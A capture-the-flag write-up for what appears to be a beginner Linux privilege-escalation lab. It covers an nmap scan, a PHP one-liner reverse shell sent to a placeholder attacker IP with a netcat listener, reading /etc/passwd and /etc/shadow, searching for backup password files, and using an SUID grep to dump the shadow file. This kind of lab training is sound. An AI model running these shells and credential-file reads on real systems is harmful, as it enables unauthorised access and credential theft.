First a quick nmap scan even though the room gives us all the details:

map -sC -sV 10.10.31.232
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 16:07 EST
Nmap scan report for 10.10.31.232
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 35:30:91:45:b9:d1:ed:5a:13:42:3e:20:95:6d:c7:b7 (RSA)
|   256 f5:69:6a:7b:c8:ac:89:b5:38:93:50:2f:05:24:22:70 (ECDSA)
|_  256 8f:4d:37:ba:40:12:05:fa:f0:e6:d6:82:fb:65:52:e8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
3000/tcp open  http    PHP cli server 5.5 or later
|_http-title: Fox's website
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.56 seconds

Copy the php payload from Method 1 and proceed to go to Machine_IP:3000/cmd.php and upload your reverse shell by changing the IP and PORT to your machine IP and your decision of port.
php -r ‘$sock=fsockopen(“YOUR-IP”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’
Then go to your command line and open a netcat listener on the port you set for the php payload.
Image for post
Run the the reverse shell and we have got in and we have now access as the manager.

Unit 1: TTY

We learn about upgrading your netcat shell as sudo and su as it requires so to properly run on a proper terminal. So we learn about upgrading and getting a more normal shell aka TTY shell.
How would you execute /bin/bash with perl?
Answer: perl -e ‘exec “/bin/bash”;’
Can be found online. I used GTFOBins.

Unit 1: SSH
We learn about getting access to a box via SSH which comes from ssh-keygen

Q: Where can you usually find the id_rsa file? (User = user)
Answer: /home/user/.ssh/id_rsa

Q: Is there an id_rsa file on the box? (yay/nay)
After searching for a id_rsa file of a user, I was not able to find it in this box.
Answer: Nay

Unit 2: Basic Enumartion
Here we learn about three executable commands. We learn about
uname -a to print out all information about the system,
sudo -V to retrieve sudo version.
sudo -l to check if a user on the box is allowed to use sudo with any command on the system.

Q: How would you print machine hardware name only?
Answer: uname -m

Q: Where can you find bash history?
Answer: ~/.bash_history

Q: What’s the flag?
Here we need to go the home directory of manager and use the cat/less command and to print out the bash history. following ~./bash_history
cat ~/.bash_history
A: ;)


Unit 3 — /etc
In this section we learn about: cat /etc/passwd& cat /etc/shadow

Q: Can you read /etc/passwd on the box? (yay/nay)
We can try to use the command cat /etc/passwd and see.

A: Yay

Unit 4 — Find command and interesting files
In this section we learn about the find command and learn about the switches -type and -name.
With -type f we limit the search to files only and -name allows us to search for files extentions using the wildcard (*)

Q: What’s the password you found?
To find the password we can look at the picture in the room for what command is used, combined with the hint that it could be in some interesting files like .log, .conf and .bak files.

To find the password I used the command:
find -type f -name “*.bak” 2>/dev/null

Here we find a interesting directory with a name passwords.bak. Using the command:
cat /var/opt/passwords.bak
We get the password.

Answer: ;)

Q: Did you find a flag?
To find the flag we can use the same commands only to search for a file called flag.conf as it ask to find a flag and the hint said it could be in a .conf file
find / -type f -name “flag.conf” 2>/dev/null
Answer: ;)

Unit 4 — SUID
This section is about the find command and to find SUID binaries and program files for execute privilege escalation.

Q: Which SUID binary has a way to escalate your privileges on the box?
By using the command to search for root files we use:
find / -perm -4000 2>/dev/null
By searching at GTFOBins we can see grep being the only executionable command to read files out of the files found
Answer: grep

Q:What’s the payload you can use to read /etc/shadow with this SUID?
We use the grep commandgrep '' /etc/shadowto read that file
Answer: grep '' /etc/shadow

and Viola! we are done :)
